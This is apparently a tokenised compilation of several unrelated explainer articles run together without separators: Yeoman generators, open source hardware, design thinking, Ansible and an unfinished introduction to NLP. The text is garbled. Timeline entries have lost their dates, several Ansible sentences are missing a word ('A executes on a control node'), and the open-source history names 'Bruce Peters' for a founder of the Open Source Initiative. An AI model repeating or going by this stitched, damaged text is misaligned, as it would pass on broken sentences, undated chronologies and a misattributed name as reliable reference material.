For example , a web app based on MVC pattern would include models , views and controllers .
What if you want to create an additional view or model for an existing project ?
This is where Yeoman sub - generators are useful .
One example is the Joomla3 generator by Diego Castro .
The generator creates a Joomla 3.5 component but it also has sub - generators to create CRUD for a component , a module , a plugin , a template , a rule , and so on .
Thus , generators create the basic scaffolding and sub - generators can help us add more parts to it as required .
A sub - generator is invoked using the suffix ` : subgen - name ` followed by instance name .
For example , to generator an Angular project we would call ` yo angular ` but to add an Angular service ( a sub - generator ) , we use ` yo angular : service myservice ` ; or an Angular filter using ` yo angular : filter myfilter ` .
It 's also easy to pass data from the generator to its sub - generator .
Which are the core components of Yeoman ?
The core system has the following components : ` yo ` : This is the main command - line interface for using Yeoman .
Users need to install this first and then install generators using it .
` yeoman - environment ` : This is the runtime environment .
It provides a high - level API to discover , create and run generators .
` yeoman - generator ` : This provides base classes that you can extend to make your own generators .
These classes make it easier to create generators .
All three components are open source and available in separate repositories on Yeoman 's GitHub account .
By studying the file ` package.json ` in these repositories , we can see that both ` yo ` and ` yeoman - generator ` depend on ` yeoman - environment ` .
Thus , there 's no need for developers or users to separately install the Yeoman environment .
Is Yeoman only for JavaScript - based projects ?
Folder structure created for a Java project .
Source : Zhao 2018 .
While Yeoman started with the idea of improving workflows of JavaScript - based projects , today it 's used in many other types of projects .
A generator is written as a Node.js module , but otherwise it can target any project and create boilerplate code in any language .
An example is ` generator - jvm ` that creates a Java project .
By passing the option ` --type java - spring - boot ` to this generator , we can create a Java Spring Boot project .
Another example is ` generator - joomla3 ` .
Joomla is a Content Management System ( CMS ) based on PHP and yet we have a generator ( and many sub - generators ) to simplify the workflow for Joomla developers .
An interesting example is ` generator - sls ` that helps create a serverless project .
This generator can create scaffolding targeting a number of languages as desired : Go , Node.js , Python , Java , C # .
As a beginner , how can I get started with Yeoman ?
Head to the official Yeoman site and read Getting Started , Tutorials , and FAQ pages .
Start by installing ` yo ` CLI tool using the command ` npm install -g yo ` .
Subsequently , you can install any of the thousands of generators already out there .
Installing a specific generator is easy .
To install ` ngx - rocket ` for example , type ` npm install -g generator - ngx - rocket ` .
Refer to the documentation of that generator to know how to use it and create the project scaffolding .
In ` ngx - rocket ` , for example , we would start with the command ` ngx new ` and then respond to the prompts to customize the app .
What 's the procedure for creating my own Yeoman generator ?
Creating a custom yeoman generator .
Source : Hemanth 2016 .
The official documentation explains how to create your own generator .
You can start by creating a simple generator that just gives a bunch of boilerplate files .
You can also give developers options to create a customized project .
Any generator you create must depend on ` yeoman - generator ` , which in turn depends on ` yeoman - environment ` .
It 's interesting to note that there 's a generator to create a new generator .
This is called ` generator - generator ` and this is probably the best place to start for beginners .
Read the API documentation before updating the boilerplate output of this generator .
The API documentation talks about modules , classes and mixins .
The main class is named ` Generator ` .
Note that ` generator - generator ` depends on the package called ` yeoman - generator ` , which is the base from which all generators are written .
Yeoman v0.9 has been released on GitHub .
A project can be scaffolded using the command ` yeoman init ` .
Yeoman is described as " a robust and opinionated client - side stack , comprised of tools and frameworks that can help developers quickly build beautiful web applications " .
Yeoman is said to be inspired by the Rails Generator system .
Version 1.0.0 of CLI tool yo has been released .
This replaces the older commands to execute Yeoman .
As of June 2019 , Yeoman has 8000 + generators .
Some popular ones at this point include Jhipster , Loopback , Hyperledger - composer , Feathers , Code , Travis , and Node .
A selection of open source embedded development boards .
Source : Kumar B 2018 .
Many developments have contributed to the interest and growth of Open Source Hardware ( OSHW ) : free and open source software ( FOSS ) , 3D printing , crowdfunding , the maker movement , and Moore 's Law reaching its limits .
While OSHW is commonly thought to include electronics and mechanical designs , OSHW today has a much broader reach , including fashion , furniture , musical instruments , farm machinery , bio - engineering , and more .
OSHW is not a standard , nor is there a single organization tasked with leading the OSHW movement .
However , the Open Source Hardware Association ( OSHWA ) hopes to become the hub of this movement .
There 's also the Open Source Hardware Definition , which forms the basis for defining licenses for OSHW .
What 's the historical context for open source hardware ?
In the ham radio community , sharing knowledge was a common practice .
Then , in the 1970s , computers were shipped as kits with schematics included .
This resulted in a hacking culture among computer enthusiasts .
This culture was about tinkering , experimenting , sharing , and collaborating .
FOSS that started in the 1980s contributed to OSHW , although open hardware need not be about either electronics or software .
The web of the 1990s made it easier to share designs and best practices .
By early 2010s , OSHW had become more widely known for the following reasons : 3D Printing : This brought down prototyping and production costs .
It made design iterations easier and faster .
Maker Movement : Started in the mid-2000s , it established magazines , platforms , and fairs / exhibitions for people to come together , collaborate and co - create .
Maker labs brought essential tools under the roof , gave people affordable access to these tools , and thereby democratized production .
Crowdfunding : Those with good ideas can get upfront funding from potential users of the product without depending on traditional investment routes or financial institutions .
Moore 's Law : With the law reaching its limits , there 's a need to create application - specific silicon and open designs can keep costs down .
What aspects of hardware can be open sourced ?
Forms of openness in OSHW .
Source : Bonvoisin et al .
2017 , fig .
1 .
Open source hardware is about sharing the design files of hardware .
This may include architecture / design drawings , schematics , PCB layout , bill of materials , HDL code , production / assembly instructions , and anything else that can enable others to replicate the hardware .
There 's no use claiming open design if the file format is proprietary and can be opened only with closed tools .
Thus , the definition of open source can be expanded to include design file formats and/or access to tools or software to manipulate the files .
Along with original proprietary files , intermediate files in open formats should be made open .
Examples of file formats include PDFs of circuit schematics , Gerbers for circuit board layouts , and IGES or STL files for mechanical objects .
OpenCAD , KiCAD and Eagle are examples of open tools .
In the spirit of open source , users should be able to study the design , modify it for their specific needs , or distribute it .
They also have the freedom to make and sell hardware based on the design .
Wo n't people misuse my designs and get rich at my expense ?
Comparing OSS and OSHW .
Source : Reese 2019 .
Maybe , but not necessarily .
Firstly , just because you adopted OSHW licensing , does n't mean you can not also sell your products commercially and be successful in the process .
Even if others have access to your design , there 's cost and effort involved in sourcing , manufacturing , assembling , testing , distributing and providing technical support .
If you establish your own brand value , provide a quality product at a good price , it 's difficult for others to compete .
The advantage of being open is that you benefit from community support and contributions .
You establish an ecosystem around your product .
While commercial vendors offer free reference designs , OSHW is a community effort .
An open source design is likely to be more robust .
It enables faster prototyping and it 's continuously improved via multiple contributors .
In conclusion , the case for keeping your hardware design proprietary is weaker than for software .
Investment towards manufacturing and distribution is still a barrier to entry .
Hardware can also be differentiated based on the firmware that need not necessarily be open .
What business models are possible with OSHW ?
A spectrum of business models for OSHW .
Source : Zimmermann 2013 .
Your design may be open and freely shared but you may charge for products made from open designs .
Technical support , maintenance and upgrades can be part of your service model and customers will be willing to pay for them .
You could create innovative services around open designs .
You could then set up an online marketplace , aggregate and analyze data , etc .
Openness becomes an incentive for customers because they have the freedom to tinker and customize .
You can provide them with training , resources , and additional services .
Your product and its open design should be a market enabler .
You can build an entire platform based on your open design .
You can partner with others for peripherals that may or may not be open .
In any case , a healthy ecosystem based on your open design will likely lead to better adoption and sales of your core products .
This has been the case with Arduino and add - on boards called shields ; and Raspberry Pi and add - on boards called hats .
What 's the recommended licensing for OSHW ?
Some boards and their licenses .
Source : Hegde 2015 .
In the days before any OSHW licenses were defined , people simply used FOSS licenses for CAD drawings or firmware .
To call something OSHW , it should be completely open without restrictions .
Any license that prevents commercial use is not compatible with OSHW .
" Creative " works are protected by copyright and " useful " or functional works are protected by patents .
Thus , copyrights do n't apply to hardware .
If the hardware is not patented , anyone can copy , modify or build upon the hardware .
But copying or modifying hardware is a lot easier if the design files are available .
Thus , when we talk about open licensing or copyleft for hardware , we are referring to the design files and related documentation .
In the world of software , there are plenty of licenses with different degrees of openness .
Among the copyleft ( share - alike or viral ) licenses are GPL , CC BY - SA , CERN Open Hardware License ( OHL ) and TAPR Open Hardware License ( OHL ) .
Permissive licenses that allow for closed derivatives include FreeBSD , MIT , CC Attribution , and Solderpad Hardware License .
What are some examples of OSHW projects ?
OSHW characterization by category ( a ) , technology ( b ) and project status ( c ) .
Source : Bonvoisin et al .
2017 , fig .
2 .
Well - known examples that use CC BY - SA include Arduino , mBed HDK , BeagleBoard , Particule ( formerly Spark ) , and Tessel .
Mangoh is an example that uses the Creative Commons Attribution license .
Back in 2013 , some successful OSHW projects included Arduino , Raspberry Pi , OpenROV ( remote - operated underwater robot ) , DIY Drones , LittleBits , and Makerbot Replicator 2 , Lasersaur , Robo3D , and Console II .
Noteworthy projects of 2016 included the Global Village Construction Set ( fabricate industrial machines ) , Open Source Beehives ( bee home and sensor kits for tracking ) , AKER garden kits , WikiHouse ( building system ) , FarmBot ( CNC farming machine ) , OpenDesk ( make furniture ) , OSVehicle , RepRap ( 3D printer ) , OpenKnit ( digital knitting ) , Defense Distributed ( 3D firearms ) , APM : Copter , and Open Hand Project ( robotic prosthetic hands ) .
Some OSHW boards include Arduino Due , Freescale Freedom , Microchip ChipKIT Uno32 , and Beaglebone Black .
The Mouser 's website also lists dozens of other boards .
Olimex offers OSHW boards including Linux - based OLinuXino boards .
At the chip level , RISC - V offers an open architecture from which customized SoCs can be designed .
Others include lm32 , mor1kx , and blocks from the OpenCores project .
There 's talk of even building an open source supercomputer .
What are some online resources for OSHW ?
Design files , particularly for 3D printing , can be downloaded from Thingiverse , MyMiniFactory , Pinshape , and Cults .
Thingiverse was launched in 2008 and it encourages folks to modify and re - upload designs to the site .
Other sources are Hackster.io , Hackaday , Open Electronics and the Open Circuits Institute .
For crowdfunding , try CrowdSupply , Kickstarter , Goteo and Tindie .
Adafruit and SparkFun , while selling proprietary products , also promote OSHW .
Olimex , Pandaboard.org , and SolderCore are suppliers of OSHW that are also available from Mouser .
If you 're open sourcing your own product , you may release the design files on your own website , on Thingiverse or similar sites .
If you wish to make it open during the design and development stages , GitHub or its alternatives can be a place to share .
Prusa Mendel and Mendel90 are just two examples of projects that have received lots of community contributions , what in tech speak are called " pull requests " .
Element14 has an online community forum for discussions on OSHW .
At a garage in Menlo Park , California , some computer hobbyists have the first meeting of their newly formed Homebrew Computer Club .
At such a meeting , Steve Wozniak gets inspired to build his own computer and share the blueprints with others .
This leads to Apple-1 .
However , Steve Jobs convinces Wozniak to sell Apple-1 rather than share them freely , thus marking the birth of Apple in 1977 .
Bruce Peters launched the Open Hardware Certification Program to allow vendors to self - certify their products as open .
This implies availability of documentation so that anyone can write their own device drivers .
Mozilla releases source code for the Netscape browser suite .
Not wanting to call it free software ( in the spirit of Richard Stallman 's Free Software Foundation ) , the term Open Source is coined .
The Open Source Initiative ( OSI ) was also formed by Eric Raymond and Bruce Peters .
At this point , it 's all about software , not hardware .
Hernando Barragán created wiring so that designers and artists could approach electronics and programming more easily .
This work led to the creation of Arduino in 2005 .
The birth of the modern maker movement starts with the launch of Make : magazine .
In August , Instructables launched as an online platform to share step - by - step instructions to make something .
Dale Dougherty organized the first Maker Faire for makers to showcase their creations .
In October , as an open - access DIY workshop , TechShop opens in Menlo Park , California .
At an open hardware workshop in March , some folks defined the Open Source Hardware Definition 0.1 .
In July , v0.3 was made public .
These are based on the definition of open source ( from 1998 ) .
As of June 2019 , Open Source Hardware ( OSHW ) Definition 1.0 is current .
Open - Source Hardware Definition is not itself a license but OSHW licenses are written so as to be compatible with the definition .
In September , the first Open Hardware Summit was organized in New York City .
Since then , it has become an annual event .
Logo of Open Source Hardware ( OSHW ) .
Source : OSHWA 2019 .
The original gear logo of OSHW was selected via a community contest .
A modified version of the winning logo was announced at the Open Hardware Summit .
In July , the CERN Open Hardware License ( OHL ) was announced .
To facilitate collaboration and sharing , CERN had already set up the Open Hardware Repository in January 2009 .
The first Raspberry Pi Model B was released as a credit - card - sized single - board computer ( SBC ) retailing at only $ 35 .
The idea is to make computers affordable , accessible and fun for a new generation of programmers .
Within two years , 2.5 million units are sold .
By 2018 , 22 million will be sold worldwide .
Also , in 2012 , the Open Source Hardware Association ( OSHWA ) was formed .
Certification of OSHW is also done by the Association .
The U.S. DARPA announced funding of $ 1.5 billion over five years for what it calls the Electronic Resurgence Initiative ( ERI ) .
This includes the POSH ( Posh Open Source Hardware ) project meant to create a Linux - based platform for the design and verification of open source hardware IP blocks for SoCs .
Esperanto , Google , SiFive , and Western Digital got together to form the CHIPS Alliance .
The purpose is to foster open - source chip designs .
The alliance is committed to RISC - V architecture but wishes to encourage more such open designs .
Design thinking is a problem - solving method used to create practical and creative solutions while addressing the needs of users .
The process is extremely user-centric as it focuses on understanding the needs of users and ensuring that the solutions created solve users ' needs .
It 's an iterative process that favours ongoing experimentation until the right solution is found .
Why is the design thinking process important ?
Benefits of Design Thinking .
Source : Spencer 2017 .
Design thinking helps us to innovate , focus on the user , and ultimately design products that solve real user problems .
The design thinking process can be used by companies to reduce the time it takes to bring a product to the market .
Design thinking can significantly reduce the amount of time spent on design and development .
The design thinking process increases return on investment as the products are user - centric , which helps increase user engagement and user retention .
It 's been seen that a more efficient workflow due to design thinking gives 75 % savings in design and development time , a 50 % reduction in defect rate , and a calculated ROI of more than 300 % .
When and where should the design thinking process be used ?
Introduction to design thinking .
Source : Humble 2018 .
The design thinking process should especially be used when dealing with human - centric challenges and complex challenges .
The design thinking process helps break down complex problems and experiment with multiple solutions .
Design thinking can be applied in these contexts : human - centred innovation , problems affecting diverse groups , involving multiple systems , shifting markets and behaviours , complex societal challenges , problems that data ca n't solve , and more .
A class of problems called wicked problems is where design thinking can help .
Wicked problems are not easy to define and information about them is confusing .
They have many stakeholders and complex interdependencies .
On the contrary , design thinking is perhaps overkill for obvious problems , especially if they 're not human centred .
In such cases , traditional problem - solving methods may suffice .
What are the principles of the design thinking process ?
There are some basic principles that guide us in applying design thinking : The human rule : All design activity is social because all social innovation will bring us back to the " human - centric point of view " .
The ambiguity rule : Ambiguity is inevitable , and it ca n't be removed or oversimplified .
Experimenting at the limits of your knowledge and ability is crucial to being able to see things differently .
The redesign rule : While technology and social circumstances may change , basic human needs remain unchanged .
So , every solution is essentially a redesign .
The tangibility rule : Making ideas tangible by creating prototypes allows designers to communicate them effectively .
What are the typical steps of a design thinking process ?
The design thinking process .
Source : Adapted from Think Design & Convert 2018 .
The process involves five steps : Empathy : Put yourself in the shoes of the user and look at the challenge from the point of view of the user .
Refrain from making assumptions or suggesting answers .
Suspend judgements throughout the process .
Define : Create a challenge statement based on the notes and thoughts you have gained from the empathizing step .
Go back to the users and modify the challenge statement based on their inputs .
Refer to the challenge statement multiple times throughout the design thinking process .
Ideate : Come up with ideas to solve the proposed challenge .
Put down even the craziest ideas .
Prototype : Make physical representations of your ideas and solutions .
Get an understanding of what the final product may look like , identify design flaws or constraints .
Take feedback from users .
Improve the prototype through iterations .
Test : Evaluate the prototype on well - defined criteria .
Note that empathy and ideate are divergent steps whereas others are convergent .
Divergent means expanding information with alternatives and solutions .
Convergent is reducing information or filtering to a suitable solution .
What should I keep in mind when applying the design thinking process ?
Design thinking and Scrum complement each other .
Source : Yoshida 2018 .
Every designer can use a variation of the design thinking process that suits them and customize it for each challenge .
Although distinct steps are defined , design thinking is not a linear process .
Rather , it 's very much iterative .
For example , during prototyping we may go back to redefine the problem statement or look for alternative ideas .
Every step gives us new information that might help us improve on previous steps .
Adopt agile methodology .
Design thinking is strong on ideation while Scrum is strong on implementation .
Combine the two to make a powerful hybrid Agile approach .
While the steps are clear , applying them correctly is not easy .
To identify what annoys your clients , ask questions .
Empathy means that you should relate to their problems .
Open - ended questions will stimulate answers and help identify the problems correctly .
At the end of the process , as a designer , reflect on the way you 've gone through the process .
Identify areas of improvement or how you could have done things differently .
Gather insights on the way you went through the design thinking process .
What do I do once the prototype is proven to work ?
Iterate on prototyping and validation .
Source : McConell 2015 .
The prototype itself can be said to " work " only after we have submitted it to the clients for feedback .
Use this feedback to improve the prototype .
Make the actual product after incorporating all the feedback from the prototype .
Gathering feedback itself is an important activity .
Present your solution to the client by describing the thought process by which the challenge was solved .
Take notes from users and ensure that they are satisfied with the final product .
It 's important not to defend your product .
It 's more important to listen to what users have to say and make changes to improve the solution .
present several versions of the prototype so that users can compare and express what they like and dislike .
Consider using the I Like , I Wish , What If method for gathering feedback .
Get feedback from regular users as well as extreme users with highly opinionated views .
Be flexible and improvise during testing sessions .
Allow users to contribute ideas .
Recognize that prototyping and testing is an iterative process .
Be prepared to do this a few times .
What are some ways to get more ideas ?
Design thinking is not about applying standard off - the - shelf solutions .
It 's about solving difficult problems that typically require creative approaches and innovation .
The more ideas , the better .
Use different techniques such as brainstorming , mind mapping , role plays , storyboarding , etc .
Innovation is not automatic and needs to be fostered .
We should create the right mindsets , an open and explorative culture .
Designers should combine both logic and imagination .
Teams should be cross - disciplinary and collaborative .
Work environments must be conductive to innovation .
When framing the problem , think about how the challenge can be solved in a certain place or scenario .
For example , think about how one of your ideas would function differently in a setting such as a kitchen .
Write down even ideas that may not work .
Further research and prototyping might help refine it .
Moreover , during the prototyping and testing steps , current ideas can spark new ideas .
The Conference on Systematic and Intuitive Methods in Engineering , Industrial Design , Architecture and Communications is held in London .
It explores design processes and new design methods .
Although the birth of design methodology can be traced to Zwicky 's Morphological Method ( 1948 ) , it 's this conference that recognizes design methodology as a field of academic study .
The term Design Science is introduced .
This shows that the predominant approach is to find " a single rationalised method , based on formal languages and theories " .
Herbert A. Simon , a Nobel Prize laureate and cognitive scientist , mentions the design thinking process in his book The Sciences of the Artificial and further contributes ideas that are now known as the principles of design thinking .
This decade sees some resistance to the adoption of design methodology .
Even early pioneers begin to dislike " the continual attempt to fix the whole of life into a logical framework " .
Rittel publishes The State of the Art in Design Methods .
He argues that the early approaches of the 1960s were simplistic , and a new generation of methodologies began to emerge in the 1970s .
Rather than optimizing through systematic methods , the second generation is about finding a satisfactory solution in which designers partner with clients , customers and users .
This approach is probably more relevant to architecture and planning than engineering and industrial design .
This decade saw the development of engineering design methodology .
An example is the series of International Conferences on Engineering Design .
The American Society of Mechanical Engineers also launched a series of conferences on Design Theory and Methodology .
The evolution of the design thinking process .
Source : Dam and Siang 2019 .
Nigel Cross discusses the problem - solving nature of designers in his seminal paper Designerly Ways of Knowing .
Peter Rowe , Director of Urban Design Programs at Harvard , publishes his book Design Thinking .
This explores the underlying structure and focus of inquiry in design thinking .
IDEO , an international design and consulting firm , brings design thinking to the mainstream by developing their own customer - friendly technology .
When software is delivered as a service , it 's important that the server and the application running on it are initialized or configured correctly .
Sometimes server modules or the application itself will need to be patched or upgraded .
This task is more difficult when the service resides in the cloud and is running on multiple servers .
What we need is a tool to automate these tasks .
This is where Ansible is useful .
Ansible is well known as a configuration tool that can help us put a remote machine into a desired state .
But Ansible can do more : deploy applications , orchestrate multiple tasks across multiple machines , run ad - hoc commands .
In short , Ansible is a tool that enables Infrastructure - as - Code ( IaC ) .
Ansible is open source and is sponsored by Red Hat .
What are some typical use cases of Ansible ?
Ansible for automating data collection for evaluating Wi - Fi network performance .
Source : Holmberg 2016 .
The main uses of Ansible are the following : Provisioning : Provision bare - metal servers , VMs , cloud instances , and more .
Configuration Management : Centralize configuration and push the same to all machines .
This means a consistent environment for your services regardless of the machine .
App Deployment : Manage your app 's lifecycle easily , from development to production .
Continuous Delivery : Create CI / CD pipelines without additional complexity .
Security & Compliance : Scan and remediate site - wide security policies .
Orchestration : Orchestrate how multiple configurations interact ; manage the environment as a whole and not in silos .
Consider an example of orchestration .
A three - tier web app will have app servers , database servers , content servers , load balancers and a monitoring system .
A can do a complex cluster - wide rolling update without any downtime .
In fact , Ansible enables immutable infrastructure , meaning that we can replace servers without service disruption .
It 's interesting to note that possible configuration can be seen as a type of documentation and a solution for disaster recovery .
In Ansible , what do you mean by " agentless " architecture ?
Ansible pushes configuration rather than requiring hosts to pull .
Source : Berder 2015 .
To configure a number of host machines , one approach is to install custom programs , called agents , on each of these machines .
The system will also have a server or control node that contains the current configuration .
Each agent will periodically poll the server to obtain the configuration .
The server and agent communicate using a common pre - defined protocol and port .
This is otherwise called the pull approach .
In Ansible , there are no agents .
It uses the push approach , whereby the server pushes configuration or commands to the hosts .
Hosts are often diverse .
Installing agent programs on different OS / platforms is a hassle .
In Ansible , SSH is used by the server to talk to a host .
OpenSSH is widely deployed .
It 's open - source and lightweight .
What if an agent crashes ?
What if servers and agents have mismatching versions ?
Some agents have reportedly used 400 MB of memory .
Ansible 's agentless architecture avoids all these issues .
We can start managing the hosts with zero bootstrapping .
Could you describe some essential Ansible terms ?
From the complete Ansible Glossary , we describe a few essential terms : Node : can either be a Control Node or a Managed Node .
A is installed on control nodes but not on managed nodes .
Managed nodes are also called hosts .
Inventory : A list of managed nodes , specified by an inventory file or hostfile .
Hosts can be organized into groups for easier scaling .
Task : A unit of execution in Ansible .
Each task has an associated command and is a single operation unless it has a loop .
Playbook : An ordered list of tasks .
These are designed to be easy to read , write , share and understand .
Playbooks can use variables .
Module : Reusable code that Ansible executes and can be invoked by a task .
A comes with dozens of out - of - the - box and ready - to - use modules .
Modules are typically organized by their purpose : crypto , database , identity , messaging , network , storage , etc .
Role : Makes playbooks modular and reusable .
These are units of an organization in Ansible .
A role can apply variables , tasks or handlers to hosts or groups .
What 's Ansible architecture ?
Ansible architecture .
Source : Red Hat 2019 , 2:44 .
A executes on a control node and connects to hosts using SSH by default .
The Control node can be Linux , MacOS , or even any machine that has Python 2.7 or 3.5 + installed .
Nodes need to have either SSH or PowerShell ( Windows ) , and Python 2.6 + or 3.5 + installed .
File transfer is done using ` sftp ` or ` scp ` .
Hosts to be managed are listed in files called inventory .
Modules offer reusable execution code .
Playbooks contain step - by - step instructions .
Configuration and playbooks are stored as YAML files in a well - defined directory layout .
YAML is easier to learn than bash scripting .
Ansible Tower , the enterprise version of Ansible , allows configuration to be stored in configuration management databases ( CMDB ) , using PostgreSQL or MongoDB .
It 's been said that , if Ansible modules are the tools in your workshop , playbooks are your instruction manuals , and your inventory of hosts are your raw material .
Could you share some best practices when using Ansible ?
Keep it simple .
Think declaratively .
Do n't write codes in playbooks .
Since modules abstract away complexity , always check if there 's a module to accomplish what you want .
Avoid using run commands ( ` command ` , ` shell ` , ` raw ` , ` script ` ) , since error and state handling are difficult .
Instead , write your own modules .
Do n't ignore errors with ` ignore_errors : yes ` since you 'll miss unexpected errors as well .
Instead , use ` failed_when ` and other alternatives .
Along with roles , use ` import * ` and ` include * ` statements to logically chunk and reuse Ansible content .
In the interest of readability , use descriptive names for both plays and tasks .
Variable names can collide .
Use prefixes to avoid collisions and also improve readability , such as , ` apache_port ` and ` tomcat_port ` rather than just ` port ` .
YAML 's native syntax for name - value pairs is ` name : value ` .
Use this for readability in preference to Ansible 's shorthand ` name = value ` .
The YAML syntax is easier to read and highlighted by editors and IDEs .
When using the debug module , use the ` verbosity ` parameter to suppress debug messages in production .
Organize your playbooks based on roles .
Have separate inventory for staging and production .
Define groups based on roles and geography .
Ansible - Lint and Playbook Best Practices guides can help .
Could you point to useful resources to get started with Ansible ?
An introduction to Ansible .
Source : Jamison 2015 .
From Ansible 's official site , read an overview of Ansible .
Learn about setting up SSH keys and running your first commands in the Getting Start guide .
There are also a number of useful whitepapers on Ansible .
To be part of or contribute , read the Ansible Community Guide .
Ansible Galaxy is a hub for downloading useful roles .
The official documentation lists all Ansible modules .
While at Red Hat , Michael DeHaan started Cobbler , a tool to manage Linux server environments including provisioning , managing DNS and DHCP , updating packaging , and more .
Since Cobbler is unable to run ad - hoc tasks on remote hosts , Func was invented .
The roots of Ansible are in these early tools .
Ansible begins as a project with system administrators and developers being early adopters .
An early adopter is Fedora Infrastructure , where the Puppet is replaced with Ansible .
Ansible embraces the " batteries included " philosophy , with folks contributing modules .
Ansible 1.0 was released .
We can now use ` when_failed ` and ` when_changed ` in playbooks .
With v1.2.1 ( July 2013 ) , the default connection is OpenSSH if it supports ControlPersists ; else , fall back to Paramiko .
Ansible 1.7 has been released .
It 's the first version to support Windows hosts using native PowerShell rather than SSH .
On the control node , the Python module ` winrm ` is used .
Though the control node ca n't be Windows , the Windows Subsystem for Linux ( WSL ) bash shell can be used .
Ansible 2.0 was released .
Ansible 2.4 has been released .
For hosts , support for Python 2.4 and 2.5 has dropped .
Old ` include ` directives are replaced with ` import ` ( static ) and ` include ` ( dynamic ) .
The keyword ` order ` can be used to specify the order in which hosts are processed .
Inventory is revamped .
The release was updated in July 2018 as v2.4.7 .
Ansible 2.5 has been released .
It 's recommended to use the ` loop ` keyword instead of ` with _ * ` style loops .
The new syntax is better with filters instead of using complex ` query ` or ` lookup ` .
Two top - level persistent connection types have been introduced , ` network_cli ` and ` netconf ` .
Where possible , prefer these over ` local ` connections .
Ansible is a popular configuration tool for cloud infrastructure .
Source : Sesto 2019 .
A survey of 786 IT professionals shows that Ansible is popular as a configuration tool for cloud infrastructure .
Terraform has the largest growth in adoption .
NLP is a subset of AI and uses ML / DL techniques .
Source : Sathiyakugan 2018 .
In computer science , languages that humans use to communicate are called " natural languages " .
Examples include English , French , and Spanish .
Early computers were designed to solve equations and process numbers .
They were not meant to understand natural languages .
Computers have their own programming languages ( C , Java , Python ) and communication protocols ( TCP / IP , HTTP , MQTT ) .
To instruct computers to perform tasks , we traditionally use a keyboard or a mouse .
Why not speak to the computer and let it respond in a natural language ?
This is one of the aims of Natural Language Processing ( NLP ) .
NLP is an essential component of artificial intelligence .
NLP is rooted in the theory of linguistics .
Techniques from machine learning and deep neural networks have also been successfully applied to NLP problems .
While many practical applications of NLP already exist , NLP has many unsolved problems .
Why do computers have difficulty with NLP ?
NLP has to parse unstructured textual content to extract useful information .
Source : Waldron 2015 .
Computers mostly dealt with structured data .
This is data that 's organized , indexed and referenced , often in databases .
In NLP , we often deal with unstructured data .
Social media posts , news articles , emails , and product reviews are examples of text - based unstructured data .
To process such a text , NLP has to learn the structure and grammar of the natural language .
Importantly , 80 % of enterprise data is unstructured .
Human languages are quite unlike the precise and unambiguous nature of computer languages .
Human languages have plenty of complexities , such as ambiguous phrases , colloquialisms , metaphors , puns , or sarcasms .
The same word or text can have multiple meanings depending on the context .
Language evolves with time .
Worse still , we communicate imperfectly ( spelling , grammar or punctuation errors ) but still manage to be understood .
These variations , so natural to human communication , are complex for computers .
Ambiguities in natural languages can be classified as lexical , syntactic or referential .
When the source of information is speech , more challenges arise : accent , tone , loudness , background noise or context , pronunciation , emotional content , pauses , and so on .
Could you share some examples of the complexities of English ?
Consider the sentence , " One morning I shot an elephant in my pajamas " .
The man was in his pajamas , but grammatically , it 's also correct to think that the elephant was wearing his pajamas .
Likewise , a person may say , " Listening to loud music slowly gives me a headache " .
Was she listening to music slowly or did the headache develop slowly ?
A more confusing example is , " The complex houses married and single soldiers and their families " .
Confusion arises because we may initially interpret " complex houses " as an adjective - noun combination .
The sentence makes sense only when we see that " complex " is a noun and " houses " is a verb .
NLP addresses this via part - of - speech tagging .
Consider this one , " John had a card for Helga , but could n't deliver it because he was in her way " .
Was John on Helga 's way ?
In fact , " he " refers to an earlier reference to a third person .
NLP calls this coreference resolution .
" The Kiwis won the match " is an example that requires context to make sense .
New Zealand nationals are referred to as " Kiwis " , after their national bird .
Natural language is full of metaphors like this .
What are some examples of problems that NLP can solve ?
From the number of problems that NLP solves , we describe a few : Sentiment Analysis : From product reviews or social media messages , the task is to figure out if the sentiment is positive , neutral or negative .
This is useful for customer support , engineering and marketing departments .
Machine Translation : Suppose the original content is published only in one language , machine translation can deliver this content to a wider readership .
Tourists can use machine translation to communicate in a foreign country .
Question Answering : Given a question , an NLP engine leveraging a vast body of knowledge , can provide answers .
This can help researchers and journalists .
Whitepapers and reports can be written faster .
Text Summarization : NLP can be tasked with summarizing a long essay or an entire book .
It can provide a balanced summary of a story published on different websites with different points of view .
Text Classification : NLP can classify news stories by domain or detect email spam .
Text - to - Speech : This is an essential aspect of voice assistants .
Audiobooks can be created for the visually impaired .
Public announcements can be made .
Speech Recognition : Opposite to text - to - speech , this creates a textual representation of speech .
Who 's been using NLP in the real world , and for what purpose ?
Amazon Comprehend Medical is a service for healthcare .
Source : Simon 2018 .
Facebook uses machine translation to automatically translate posts and comments .
Google Translate processes 100 billion words a day .
To connect sellers and buyers across language barriers , eBay uses machine translation .
Using speech recognition and text - to - speech synthesis , voice assistants such as Amazon Alexa , Apple Siri , Facebook M , Google Assistant , and Microsoft Cortana are enabling human - to - device interaction using natural speech .
Amazon Comprehend offers an NLP API to perform many common NLP tasks .
This has been extended by Amazon Comprehend Medical for the healthcare domain .
Uber uses NLP for better customer support .
Human agents are involved , but they are assisted by NLP models that suggest the top three solutions .
This has reduced ticket resolution time by over 10 % .
Perception offers an NLP - based product to do theme clustering and sentiment analysis .
This helps with performance reviews and employee retention while minimizing bias .
For aircraft maintenance , NLP is used for information retrieval , troubleshooting , writing summary reports , or even directing a mechanic via a voice interface .
It 's been observed that NLP can classify defects better than humans .
What are the main approaches adopted by NLP ?
Classical NLP has given way to Deep Learning NLP .
Source : Le 2018 .
Classical NLP from the 1950s took the symbolic approach rooted in linguistics .
Given the rules of syntax and grammar , we could obtain the structure of the text .
Using logic , we could obtain the meaning .
But rules had to be hand - crafted and were often numerous .
They did n't handle colloquial text well .
The rules worked well for specific use cases but could n't be generalized .
In practice , better accuracy was achieved by using a statistical approach that began in the 1980s .
Rules were learned and they had associated probabilities .
Machine Learning ( ML ) models came in with support vector machines and logistic regression .
More recently , Deep Learning ( DL ) models that employ a neural network of many layers have brought better accuracy .
This success is partly due to the more efficient representations given by word embeddings .
NLP involves different levels or scope of analysis .
Low - level analysis is about word tokens and structure .
Mid - level analysis is about identifying entities , topics , and themes .
High - level analysis leads to meaning and understanding .
Alternatively , some classify text processing into two parts : shallow parsing or chunking and deep parsing .
How is NLP related to NLU and NLG ?
NLU is a subset of NLP .
Source : MacCartney 2014 , slide 8 .
NLP is broadly made of two parts : Natural Language Understanding ( NLU ) : This involves converting speech or text into useful representations on which analysis can be performed .
The goal is to resolve ambiguities , obtain context and understand the meaning of what 's being said .
Some say NLP is about text parsing and syntactic processing while NLU is about semantic relationships and meaning .
NLU tackles the complexities of language beyond the basic sentence structure .
Natural Language Generation ( NLG ) : Given an internal representation , this involves selecting the right words , forming phrases and sentences .
